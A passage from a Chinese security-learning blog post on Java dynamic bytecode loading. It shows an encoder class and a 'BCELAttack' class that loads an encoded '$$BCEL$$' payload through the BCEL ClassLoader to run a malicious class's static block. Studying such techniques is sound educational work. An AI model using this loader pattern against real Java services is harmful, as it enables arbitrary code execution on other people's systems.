+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line">import java.nio.file.Files;  </span><br><span class="line">import java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line">public class BCELEncoder &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] classBytes = Files.readAllBytes(Paths.get(&quot;D:\\java study\\newjava\\src\\java_class\\EvilBCEL.class&quot;));  </span><br><span class="line">        String bcelCode = Utility.encode(classBytes, true);  </span><br><span class="line">        System.out.println(bcelCode);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>BCEL攻击类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line">  </span><br><span class="line">public class BCELAttack &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        // 创建一个 BCEL 类加载器实例  </span><br><span class="line">        ClassLoader bcelLoader = new ClassLoader();  </span><br><span class="line">  </span><br><span class="line">        // 用上一步生成的 BCEL 字符串，前面拼接 &quot;$$BCEL$$&quot;        String bcelPayload = &quot;$$BCEL$$&quot; + &quot;$l$8b$I$A$A$A$A$A$A$A$5dPKK$c3$40$Q$fe$b6$af$3c$9a$da$daZ$df$82$k$84$d6$83$b9xk$R$b1T$3c$E$V$a2$bdJ$g$97$b2e$9bH$b2$v$f8$b3$f4$a0$e0$c1$l$e0$8f$SgC$7d$ceaf$e7$7b$cc$ee$ec$fb$c7$eb$h$80$pl$db$a8$60$c9B$j$N$T$cb6$9ah$ZX1$d0f$a8$f4E$q$d41C$b1$d3$j1$94$G$f1$jg$a8$7b$o$e2$X$d9l$cc$93$eb$60$y$J1$fb$a1$5c$um$3f$ce$92$90$9f$J$8d$d7$86s$nO$HC$efp$g$cc$D$H$GL$D$ab$O$d6$b0$ceP$3d$e7R$c6$bb$7ev$92$de$Y$d8p$b0$89$z$86$96V$de$862HS$f7$cb$cd$d0$d0$a8$x$83h$e2$5e$8e$a7$3cT$7f$m$ff$nU$7cF$af$8c3$o$da$5e$ce$88$d8$bdJD$a4$7c$95$f0$60$d6$5bL$fe$H3$Y$f7$ba$93$R$f9$3a$de$af$91$8a$e0I$af$3b$c2$k$ca$f4$3f$3a$K$60z$D$ca$Wu$3bT$Z$d5$f2$c1$L$d8$p$jhw$ca$95$i$y$92$ac$fa$z$dd$t$ab$O$eb$J$85f$f1$Z$a5$l$b9$9dSe$92j$a3$93$dfR$fb$Es$7e$ME$9b$B$A$A\n&quot;;  </span><br><span class="line">  </span><br><span class="line">        // 加载该类（内部会解码、defineClass），并立即实例化触发 static 块  </span><br><span class="line">        bcelLoader.loadClass(bcelPayload).newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将恶意攻击类编码成字节码之后调用BCEL编码类编码成BCEL形式 之后添加入BCEL攻击类之中攻击即可<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/bcel.png" class="" title="bcel"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>至此动态加载字节码的机制以及几种利用姿势都已经学习完善<br>我们可以发现 无论如何变换姿势 底层都落在将任意来源的字节数组通过<code>ClassLoader.defineClass()</code>转变成java实例的过程</p>
+<p>参考文章</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/19171964">java安全基础-动态加载字节码 - Yuy0ung - 博客园</a></li>
+</ul>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/images/covers/huqiu.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2026/06/30/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="类加载机制漫谈" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/06/30/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="类加载机制漫谈">
+								类加载机制漫谈			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 30日, 2026				
+							</p>
+							<p class="relate-post-content">
+								解释java字节码为什么需要编译成class文件我们首先要理解JVMjava是是一种混合型语言有编译的步骤也有解释步骤我们编写的java文件需要被编译成class文件之后才能被JVM运行
+什么是class文件传统编译型语言（C C++...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/06/30/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="类加载机制漫谈">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/yulong.jpg" alt="类加载机制漫谈"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/06/29/%E5%8F%8D%E5%B0%84/" title="反射随笔">
+								反射随笔			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 29日, 2026				
+							</p>
+							<p class="relate-post-content">
+								反射概念在java之中 万物都是对象 包括“类本身也是一个对象”（属于java.lang.Class类的对象）
+反射的本质就是在程序运行期间 通过操控这个Class对象 反向解析和操控它所代表的哪个类里面的内容（构造器，属性，方法）
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/06/29/%E5%8F%8D%E5%B0%84/" title="反射随笔">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/xuanwuhu.jpg" alt="反射随笔"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/06/21/LangChain%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="LangChain反序列化">
+								LangChain反序列化			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 21日, 2026				
+							</p>
+							<p class="relate-post-content">
+								最近在打SCTF的时候遇到一个LangChain反序列化的题目  比较新颖 于是想着学习一下
+LangChain介绍LangChain是一个用于构建大语言模型应用的开源框架 通过这个可以把常用的组件抽象成可串联的链（Chain）举个例...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/06/21/LangChain%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="LangChain反序列化">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/pingjianglu.jpg" alt="LangChain反序列化"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/04/19/filter-chain%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="filter-chain漏洞演示">
+								filter-chain漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 19日, 2026				
+							</p>
+							<p class="relate-post-content">
+								这个漏洞链被称为CNEXT 由安全员Charles Fol披露
+核心思想是利用系统内置的看似无害的模块（流过滤器）的巧妙组合 在受限的web环境之中执行命令
+原理讲解filter协议对于filter伪协议 我们肯定都不陌生这个伪协议允...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/04/19/filter-chain%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="filter-chain漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/daliyuese.jpg" alt="filter-chain漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/04/19/%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/" title="死亡绕过">
+								死亡绕过			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 19日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前言以及环境介绍本文是对p神文章谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌知识点的学习
+本文主要介绍使用filter伪协议进行死亡绕过的三种方式
+测试环境：小皮面板测试代码：exit.php
+12345&lt...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/04/19/%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87/" title="死亡绕过">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/shanghai.jpg" alt="死亡绕过"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="Phar反序列化漏洞演示">
+								Phar反序列化漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 13日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前言我们在之前学习的反序列化漏洞 无一不是利用了unserialize()这个函数 但是我们没有去考虑 假设此时的题目并没有给我们这个函数 我们还能否实现反序列化呢
+其实是可以的 在2018年的BlackHat 大会上 Sam Tho...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="Phar反序列化漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/erhaibian.jpg" alt="Phar反序列化漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/12/pearcmd%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="pearcmd漏洞演示">
+								pearcmd漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 12日, 2026				
+							</p>
+							<p class="relate-post-content">
+								1register_argc_argv性质这是PHP中的一个配置项 用于决定是否在脚本中声明_$argc_ 和 _$argv_ 变量这两个变量在命令行模式下是十分重要的
+
+$argc：表示传递给脚本的参数数量
+$argv:这是一个数组...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/12/pearcmd%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="pearcmd漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/huchenghe.jpg" alt="pearcmd漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/10/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="session反序列化漏洞测试">
+								session反序列化漏洞测试			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 10日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前置知识首先我们要了解session是什么
+session又被称为会话控制  和cookie类似 用于保持会话的但是cookie一般是存储再客户端的 session一般是存储在服务端的
+在PHP中 有一个php_session变量 用...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/10/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="session反序列化漏洞测试">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/lijiangyuan.jpg" alt="session反序列化漏洞测试"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/02/16/%E6%9C%AA%E5%91%BD%E5%90%8D/" title="好东西">
+								好东西			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 16日, 2026				
+							</p>
+							<p class="relate-post-content">
+								hello world
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/02/16/%E6%9C%AA%E5%91%BD%E5%90%8D/" title="好东西">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="好东西"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2025 - 2026, content by Su@sU. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.xml',
+		zip_Path = '/',
+		version_Path = '/',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
